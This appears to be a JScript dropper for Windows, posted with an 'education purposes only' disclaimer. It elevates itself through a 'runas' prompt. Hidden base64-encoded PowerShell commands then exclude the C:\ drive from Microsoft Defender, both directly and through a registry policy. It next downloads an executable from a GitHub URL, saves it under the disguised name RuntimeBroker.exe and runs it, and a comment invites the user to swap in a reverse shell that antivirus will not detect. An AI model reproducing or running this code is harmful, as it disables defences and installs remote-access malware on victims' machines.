// Coded on - Apr 2025
// Author - Acemapper
// For Education purposes only. I am not responsible if used for any malicious purposes

EnsureElevatedPrivileges();

function EnsureElevatedPrivileges() {

    if (!WScript.Arguments.Named.Exists("elevate")) {

        new ActiveXObject("Shell.Application").ShellExecute(WScript.FullName, "\"" + WScript.ScriptFullName + "\" /elevate", "", "runas", 1);

        WScript.Quit();

    }

}

var WshShell = new ActiveXObject("Wscript.Shell");


// UTF-16LE to Base 64 decode for windows
WshShell.run("powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA", 0, false);


// UTF-16LE to Base 64 decode for windows
WshShell.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==", 0, false);

// UTF-16LE to Base 64 decode for windows
// Change the payload here. Embedd the reverse shell here and make sure your exe is not easily detected by AV
WshShell.run("powershell -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AVgBUAGgATgBhAG0AaABoAC8AbQBhAGkAbgAvAHIAYQB3AC8AbQBhAGkAbgAvAFIAdQBuAHQAaQBtAGUAQgByAG8AawBlAHIALgBlAHgAZQAiAA0ACgAkAG8AdQB0AHAAdQB0ACAAPQAgACIAQwA6AFwAXABVAHMAZQByAHMAXABcAE4AYQBtAEMAdQByAGwAeQBcAFwARABlAHMAawB0AG8AcAAvAFIAdQBuAHQAaQBtAGUAQgByAG8AawBlAHIALgBlAHgAZQAiAA0ACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAbwB1AHQAcAB1AHQADQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAbwB1AHQAcAB1AHQA", 0, false);



WScript.exit;
